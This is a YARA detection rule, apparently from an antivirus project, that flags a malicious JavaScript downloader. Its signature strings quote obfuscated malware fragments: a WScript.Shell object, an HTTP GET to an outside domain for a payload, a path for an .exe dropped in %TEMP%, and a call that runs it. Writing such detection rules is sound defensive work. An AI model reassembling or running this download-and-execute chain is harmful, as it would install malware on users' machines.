rule sig_20160328_2d6b9304a1382035bac6d44013276da6 {
  meta:
    description = "datamaliciousorder - file 20160328_2d6b9304a1382035bac6d44013276da6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c3c1a95c0a23a25242984c941b9356399fc78f154976a8e87c8807f1fd097ac3"

  strings:
    $s1  = "function Gogxozcfj() {return Ybkdx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"pRaNRVIBQzUamh.exe\";};" fullword ascii
    $s2  = "Nqrhewlqg[Ahlnzf](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Gqqij](Kqppryvx() * 11)} while (Nqrhewlqg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ybkdx = function Pdpvr() {return WScript[Yllykuer](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Oqrldhr(Wwwjodasf, Xuibo){return Wwwjodasf - Xuibo;};" fullword ascii
    $s6  = "function Iauniqnxuy(Wpztfbm){Ybkdx[\"Run\"](Wpztfbm, Ydwerv, Ydwerv);};" fullword ascii
    $s7  = "function Bbxkdtjk() {return ((Pdaxifwwgm == true) && (Pdaxifwwgm == Elvqvi)) ? 1 : Ydwerv;};" fullword ascii
    $s8  = "var Kopsiq = new this[\"Date\"]();" fullword ascii
    $s9  = "function Hjvlhykbxe(){return Wukas;};" fullword ascii
    $s10 = "var Pdaxifwwgm = false;" fullword ascii
    $s11 = "function Fdhtl(){return Yllykuer;};" fullword ascii
    $s12 = "function Jadxdgese()" fullword ascii
    $s13 = "function Kqppryvx(){return 22;};" fullword ascii
    $s14 = "Pdaxifwwgm = true; " fullword ascii
    $s15 = "var Tbcrxepbut = false;" fullword ascii
    $s16 = "Elvqvi = true; " fullword ascii
    $s17 = "return Oqrldhr(Mwrylqd, Vrfvqqij);" fullword ascii
    $s18 = "function Dkjgbf(Wcmhkpbq) {var Vjeicihwyi = (1, 2, 3, 4, 5, Wcmhkpbq); return Vjeicihwyi;};" fullword ascii
    $s19 = "var Elvqvi = false;" fullword ascii
    $s20 = " while (Egzsbkpag){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}